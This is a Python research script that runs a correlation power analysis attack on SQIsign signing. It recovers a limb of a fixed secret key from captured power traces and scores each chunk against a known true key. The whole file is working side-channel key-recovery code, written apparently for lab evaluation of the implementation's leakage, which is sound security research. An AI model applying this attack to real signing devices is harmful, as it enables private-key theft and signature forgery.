#!/usr/bin/env python3
"""
CPA against SQIsign Algorithm 3.23 line 12: (c1, c2) <- Msk * [1, achl]^T.

Target intermediate
-------------------
ibz_mul (mp.c:431) is schoolbook over 32-bit limbs:

    for i: for j:  prod_ij = (ddigit_t)a.limbs[i] * b.limbs[j]
                   res.limbs[i+j] = low32(res.limbs[i+j] + low32(prod_ij) + carry)

with a = Msk[0][1] (secret, fixed across every signature) and b = achl (known,
in the signature). The first iteration, i = j = 0, writes

    res.limbs[0] = (a0 * b0) mod 2^32

which depends on one secret limb and one known limb, and nothing else.

Why it is attackable byte by byte: multiplication is a ring homomorphism modulo
powers of two, so (a0 * b0) mod 2^(8k) depends only on a0 mod 2^(8k). Guessing
the low byte of a0 is 256 hypotheses and predicts the low byte of the product;
with that byte fixed, the next byte is 256 more, and so on. Four rounds of 256
recover the whole 32-bit limb, instead of 2^32 at once.

The leakage model is the Hamming weight of the predictable part of the product.
The unpredicted high bits act as independent noise, which costs correlation but
not correctness -- and since Msk is fixed, traces can be accumulated until the
margin is there, unlike the Algorithm 3.18 line 2 target where each trace had a
fresh secret.

Usage:
  ~/.cwvenv/bin/python3 cpa_chall.py --npz /tmp/sqisign_chall_cpa.npz
  ~/.cwvenv/bin/python3 cpa_chall.py --npz ... --curve 500,1000,2000,5000,10000
"""

import argparse
import pathlib
import sys

import numpy as np

MASK32 = 0xFFFFFFFF
POPCNT = np.array([bin(i).count("1") for i in range(256)], dtype=np.uint8)


def hw_array(vals, nbytes):
    """Hamming weight of the low nbytes of each value in a uint64 array."""
    v = np.asarray(vals, dtype=np.uint64)
    out = np.zeros(v.shape, dtype=np.int16)
    for k in range(nbytes):
        out += POPCNT[((v >> np.uint64(8 * k)) & np.uint64(0xFF)).astype(np.uint8)]
    return out


def corr_all(T_centred, T_norm, model):
    """|corr| of every sample against one model vector."""
    m = np.asarray(model, dtype=np.float64)
    m = m - m.mean()
    mn = np.sqrt((m * m).sum())
    if mn == 0:
        return np.zeros(T_centred.shape[1])
    return np.abs((T_centred * m[:, None]).sum(axis=0) / (T_norm * mn))


def corr_at_poi(x, xn, models):
    """|corr| between one sample column and each row of a model matrix."""
    M = models.astype(np.float64)
    M -= M.mean(axis=1, keepdims=True)
    mn = np.sqrt((M * M).sum(axis=1))
    mn = np.where(mn == 0, np.finfo(np.float64).tiny, mn)
    return np.abs(M @ x) / (mn * xn)


def hw_rows(prod, nbytes):
    out = np.zeros(prod.shape, dtype=np.int16)
    for k in range(nbytes):
        out += POPCNT[((prod >> np.uint64(8 * k)) & np.uint64(0xFF)).astype(np.uint8)]
    return out


def recover_chunked(x, xn, b0, chunk_bits=16, total_bits=32, truth=None,
                    batch=1 << 14, verbose=True):
    """Recover the secret limb in chunks of `chunk_bits`, low chunk first.

    A one-byte model predicts only 8 of the 32 product bits, so the remaining 24
    behave as noise and ghost hypotheses outrank the truth no matter how many
    traces are added -- that is a model limit, not a statistical one. Widening
    the chunk to 16 bits predicts half the product and separates cleanly, at the
    cost of 65536 hypotheses per round instead of 256.
    """
    known = 0
    known_bits = 0
    results = []
    while known_bits < total_bits:
        nbits = min(chunk_bits, total_bits - known_bits)
        H = 1 << nbits
        pred_bits = known_bits + nbits
        pred_bytes = (pred_bits + 7) // 8
        mask = np.uint64((1 << pred_bits) - 1)

        scores = np.empty(H)
        for s0 in range(0, H, batch):
            hyp = np.arange(s0, min(s0 + batch, H), dtype=np.uint64)
            full = np.uint64(known) | (hyp << np.uint64(known_bits))
            prod = (full[:, None] * b0[None, :]) & mask
            scores[s0:s0 + len(hyp)] = corr_at_poi(x, xn, hw_rows(prod, pred_bytes))

        order = np.argsort(scores)[::-1]
        best = int(order[0])
        margin = scores[order[0]] - scores[order[1]]
        rank = None
        if truth is not None:
            tchunk = (truth >> known_bits) & (H - 1)
            rank = int(np.flatnonzero(order == tchunk)[0]) + 1
        if verbose:
            tag = ""
            if rank is not None:
                tag = f"   true=0x{(truth >> known_bits) & (H - 1):0{nbits // 4}x} " \
                      f"rank={rank}/{H}" + ("  HIT" if rank == 1 else "  MISS")
            print(f"    bits {known_bits:2d}-{known_bits + nbits - 1:2d}: "
                  f"best=0x{best:0{nbits // 4}x}  |corr|={scores[order[0]]:.4f}  "
                  f"2nd={scores[order[1]]:.4f}  margin={margin:.4f}{tag}")
        results.append({"bits": (known_bits, known_bits + nbits), "best": best,
                        "rank": rank, "corr": float(scores[order[0]]),
                        "margin": float(margin)})
        known |= best << known_bits
        known_bits += nbits
        if truth is not None and rank != 1:
            if verbose:
                print("    -> wrong chunk, later chunks build on it; stopping")
            break
    return known, results


def main():
    p = argparse.ArgumentParser(description="CPA on Alg 3.23 line 12")
    p.add_argument("--npz", required=True)
    p.add_argument("--traces", type=int, default=None, help="use only the first N traces")
    p.add_argument("--curve", default=None, help="comma-separated trace counts to sweep")
    p.add_argument("--poi", type=int, default=None,
                   help="centre the attack on this sample instead of the whole window")
    p.add_argument("--poi-width", type=int, default=400,
                   help="half-width of the POI window, in samples")
    p.add_argument("--chunk-bits", type=int, default=16,
                   help="hypothesis width per round; 8 is too narrow to beat the "
                        "ghosts, 16 predicts half the product and separates")
    p.add_argument("--find-poi", action="store_true",
                   help="locate the POI by correlating the true product, a profiling "
                        "step: an attacker does this on a device whose key they know")
    args = p.parse_args()

    if not pathlib.Path(args.npz).exists():
        print(f"missing: {args.npz}", file=sys.stderr)
        return 1

    d = np.load(args.npz, allow_pickle=False)
    T = d["traces"].astype(np.float64)
    limbs = d["coeff_limbs"]
    secret = [int(x, 16) for x in d["secret_hex"]]
    target_secret = secret[1]  # Msk[0][1], the entry that multiplies achl
    a0_true = target_secret & MASK32

    n_all = T.shape[0]
    print(f"\n{'=' * 74}")
    print(f"{args.npz}")
    print(f"  {n_all} traces, {T.shape[1]} samples")
    print(f"  target: Msk[0][1] = 0x{target_secret:032x}")
    print(f"  attacking limb 0 = 0x{a0_true:08x} (known here only to score the attack)")

    def prep(n):
        X = T[:n]
        Xc = X - X.mean(axis=0, keepdims=True)
        Xn = np.sqrt((Xc * Xc).sum(axis=0))
        Xn = np.where(Xn == 0, np.finfo(np.float64).tiny, Xn)
        return Xc, Xn

    # Restricting the attack to the window where the target intermediate actually
    # lands removes ghost peaks from the thousands of unrelated samples and makes
    # the byte ranking far sharper.
    poi = args.poi
    if args.find_poi and poi is None:
        Xc, Xn = prep(n_all)
        prod = (np.uint64(a0_true) * limbs[:, 0].astype(np.uint64)) & np.uint64(MASK32)
        r = corr_all(Xc, Xn, hw_array(prod, 4))
        poi = int(np.argmax(r))
        print(f"  profiled POI: sample {poi}, |corr| of the true product = {r[poi]:.4f}")
    if poi is None:
        print("  no POI given; pass --find-poi or --poi", file=sys.stderr)
        return 1
    poi_local = poi
    print(f"  attacking the single sample {poi}")

    counts = [int(x) for x in args.curve.split(",")] if args.curve else [args.traces or n_all]
    for n in counts:
        n = min(n, n_all)
        print(f"\n-- {n} traces --")
        Xc, Xn = prep(n)
        b0 = limbs[:n, 0]
        x = Xc[:, poi_local].copy()
        xn = np.sqrt((x * x).sum())
        got, _ = recover_chunked(x, xn, b0.astype(np.uint64),
                                 chunk_bits=args.chunk_bits, truth=a0_true)
        ok = got == a0_true
        nbytes_ok = sum(1 for k in range(4)
                        if ((got >> (8 * k)) & 0xFF) == ((a0_true >> (8 * k)) & 0xFF))
        print(f"    recovered 0x{got:08x}  vs true 0x{a0_true:08x}  "
              f"-> {nbytes_ok}/4 bytes correct{'  FULL LIMB RECOVERED' if ok else ''}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
